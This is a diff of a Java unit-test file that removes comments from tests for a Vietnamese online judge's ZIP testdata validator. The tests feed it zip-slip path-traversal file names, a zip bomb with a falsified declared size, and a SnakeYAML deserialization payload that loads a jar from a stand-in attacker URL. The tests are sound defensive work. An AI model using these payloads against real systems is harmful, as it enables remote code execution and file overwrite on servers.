@@ -19,23 +19,9 @@ import java.util.zip.ZipOutputStream;
 import static org.assertj.core.api.Assertions.assertThat;
 import static org.assertj.core.api.Assertions.assertThatThrownBy;
 
-/**
- * ★ Bộ test tấn công cho gói testdata — FR-PROB-03, Bước 4.10.
- *
- * <h2>Vì sao lớp này quan trọng ngang bộ 14 ca tấn công sandbox</h2>
- * Đây là bề mặt thứ hai mà người ngoài đưa <b>dữ liệu tuỳ ý</b> vào hệ thống. Bề mặt thứ nhất
- * là mã nguồn bài nộp, và nó đã có {@code isolate} bao quanh. Bề mặt này thì không có sandbox
- * nào cả: file ZIP được giải nén <i>trong chính tiến trình đang giữ đường nộp bài</i>.
- *
- * <p>Ba lớp tấn công được kiểm ở đây, và cả ba đều là CVE có thật ở phần mềm khác:
- * <b>zip bomb</b> (phình bộ nhớ/đĩa), <b>zip slip</b> (ghi ra ngoài thư mục đích), và
- * <b>YAML deserialization</b> (thực thi mã từ xa qua SnakeYAML).
- */
 class ZipTestdataValidatorTest {
 
     private final ZipTestdataValidator validator = new ZipTestdataValidator();
-
-    // -------------------------------------------------------------------------
 
     private static byte[] zip(Map<String, byte[]> muc) {
         var ra = new ByteArrayOutputStream();
@@ -55,7 +41,6 @@ class ZipTestdataValidatorTest {
         return s.getBytes(StandardCharsets.UTF_8);
     }
 
-    /** Gói hợp lệ nhỏ nhất: manifest + hai test, test 1 là sample. */
     private static Map<String, byte[]> goiTot() {
         var m = new LinkedHashMap<String, byte[]>();
         m.put("problem.yaml", b("samples: [1]\n"));
@@ -70,8 +55,6 @@ class ZipTestdataValidatorTest {
         byte[] goi = zip(muc);
         return validator.kiem(new ByteArrayInputStream(goi), goi.length);
     }
-
-    // =========================================================================
 
     @Nested
     @DisplayName("Gói hợp lệ")
@@ -91,9 +74,6 @@ class ZipTestdataValidatorTest {
         @Test
         @DisplayName("★ thứ tự KHÔNG phụ thuộc thứ tự entry trong file ZIP")
         void thu_tu_on_dinh() {
-            // Công cụ nén của Linux và Explorer của Windows ghi entry theo thứ tự khác nhau.
-            // Nếu ordinal đi theo thứ tự entry thì "test số 7" nghĩa khác nhau ở hai máy —
-            // và verdict của cùng một bài nộp khác nhau tuỳ ai đóng gói.
             var nguoc = new LinkedHashMap<String, byte[]>();
             nguoc.put("tests/02.out", b("30\n"));
             nguoc.put("tests/02.in", b("10 20\n"));
@@ -125,12 +105,9 @@ class ZipTestdataValidatorTest {
         @Test
         @DisplayName("đếm đúng tổng byte sau giải nén")
         void dem_tong_byte() {
-            // 4 file test + manifest.
             assertThat(kiem(goiTot()).tongByte()).isEqualTo(4 + 2 + 6 + 3 + "samples: [1]\n".length());
         }
     }
-
-    // =========================================================================
 
     @Nested
     @DisplayName("★ Mục lục — khoá lạ là LỖI, không phải thứ bỏ qua trong im lặng")
@@ -145,8 +122,6 @@ class ZipTestdataValidatorTest {
         @Test
         @DisplayName("★ mục lục kiểu 'tests:' bị TỪ CHỐI, và nói thứ tự test lấy từ đâu")
         void danh_sach_test_bi_tu_choi() {
-            // Đây là mục lục một người ra đề cẩn thận sẽ viết. Trước bản sửa này nó nạp
-            // THÀNH CÔNG và không test nào thành sample — sai mà không ai biết.
             assertThatThrownBy(() -> kiem(voiManifest("""
                     tests:
                       - input: 1.in
@@ -162,8 +137,6 @@ class ZipTestdataValidatorTest {
         @Test
         @DisplayName("★ khoá của trang soạn đề bị từ chối — nạp testdata KHÔNG được đổi giới hạn")
         void khoa_cua_trang_soan_de_bi_tu_choi() {
-            // Nếu khoá này đọc được thì nạp một gói là đổi được giới hạn thời gian của một đề
-            // đang thi, mà đường nạp testdata không ghi audit_log nào.
             assertThatThrownBy(() -> kiem(voiManifest("time_limit_ms: 5000\n")))
                     .isInstanceOf(ProblemsException.class)
                     .hasMessageContaining("time_limit_ms")
@@ -173,8 +146,6 @@ class ZipTestdataValidatorTest {
         @Test
         @DisplayName("★ 'sample' thiếu chữ s cũng bị bắt — đó là lý do dùng danh sách TRẮNG")
         void go_sai_chinh_ta_cung_bi_bat() {
-            // Một danh sách đen chỉ bắt được khoá ai đó đã nghĩ ra. Lỗi gõ thiếu một chữ cái
-            // là cách hỏng âm thầm nhất, và không danh sách đen nào liệt kê nó.
             assertThatThrownBy(() -> kiem(voiManifest("sample: [1]\n")))
                     .isInstanceOf(ProblemsException.class)
                     .hasMessageContaining("'sample'")
@@ -213,7 +184,7 @@ class ZipTestdataValidatorTest {
                     "tests//..//x.in",
                     "C:\\Windows\\system32.in",
                     "tests/\u0000.in",
-                    "tests/sub/deep.in",          // chỉ một tầng tests/ được phép
+                    "tests/sub/deep.in",
                     "khac/01.in"}) {
                 var m = goiTot();
                 m.put(ten, b("x"));
@@ -228,12 +199,6 @@ class ZipTestdataValidatorTest {
         @Test
         @DisplayName("★ và ngay cả khi lọt, nội dung vẫn KHÔNG chạm hệ thống tệp")
         void khong_ghi_ra_he_thong_tep() {
-            // Đây là lập luận cấu trúc, không phải một phép kiểm: kiem() nhận một InputStream
-            // và trả về một danh sách mô tả. Nó không mở file nào để ghi, nên một entry
-            // symlink chỉ là một file có nội dung là chuỗi đường dẫn — vô hại.
-            //
-            // Ca kiểm này canh chính tính chất ấy: nếu ai đó thêm một lời gọi ghi file vào
-            // ZipTestdataValidator, chữ ký của phương thức sẽ phải đổi và ca này đỏ.
             assertThat(ZipTestdataValidator.class.getDeclaredMethods())
                     .filteredOn(m -> m.getName().equals("kiem"))
                     .singleElement()
@@ -242,8 +207,6 @@ class ZipTestdataValidatorTest {
         }
     }
 
-    // =========================================================================
-
     @Nested
     @DisplayName("★ Zip bomb")
     class ZipBomb {
@@ -251,7 +214,6 @@ class ZipTestdataValidatorTest {
         @Test
         @DisplayName("tỉ lệ nén vượt 100:1 bị chặn TRONG LÚC đọc")
         void ti_le_nen_qua_cao() {
-            // 5MB toàn số 0 nén xuống vài KB — tỉ lệ hàng nghìn:1.
             var m = goiTot();
             m.put("tests/03.in", new byte[5 * 1024 * 1024]);
             m.put("tests/03.out", b("0\n"));
@@ -264,8 +226,6 @@ class ZipTestdataValidatorTest {
         @Test
         @DisplayName("★ KHÔNG tin ZipEntry.getSize() — kích thước khai báo là dữ liệu của kẻ tấn công")
         void khong_tin_kich_thuoc_khai_bao() {
-            // Ghi entry với setSize() khai gian một con số nhỏ. Nếu validator đọc trường đó
-            // thay vì đếm byte thật thì một bomb 10GB khai 1KB sẽ lọt qua mọi phép kiểm.
             var ra = new ByteArrayOutputStream();
             try (var out = new ZipOutputStream(ra)) {
                 for (var e : goiTot().entrySet()) {
@@ -301,8 +261,6 @@ class ZipTestdataValidatorTest {
         }
     }
 
-    // =========================================================================
-
     @Nested
     @DisplayName("★ YAML — SnakeYAML mặc định là một lỗ hổng RCE")
     class YamlDocHai {
@@ -311,7 +269,6 @@ class ZipTestdataValidatorTest {
         @DisplayName("★ payload khởi tạo lớp Java bị từ chối, KHÔNG được thực thi")
         void khong_khoi_tao_lop_java() {
             var m = goiTot();
-            // Payload kinh điển: SnakeYAML mặc định sẽ dựng đối tượng này và nạp mã từ URL.
             m.put("problem.yaml", b(
                     "samples: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                             + "[[!!java.net.URL [\"http://ke-tan-cong.test/rce.jar\"]]]]\n"));
@@ -352,8 +309,6 @@ class ZipTestdataValidatorTest {
         }
     }
 
-    // =========================================================================
-
     @Nested
     @DisplayName("Gói không hợp lệ")
     class GoiHong {
@@ -374,8 +329,6 @@ class ZipTestdataValidatorTest {
             var m = goiTot();
             m.remove("tests/02.out");
 
-            // Bỏ qua im lặng sẽ tạo ra một bộ test thiếu một ca, và không ai biết cho tới khi
-            // một bài sai vẫn được AC.
             assertThatThrownBy(() -> kiem(m))
                     .hasFieldOrPropertyWithValue("code", "problem.zip_thieu_cap");
         }
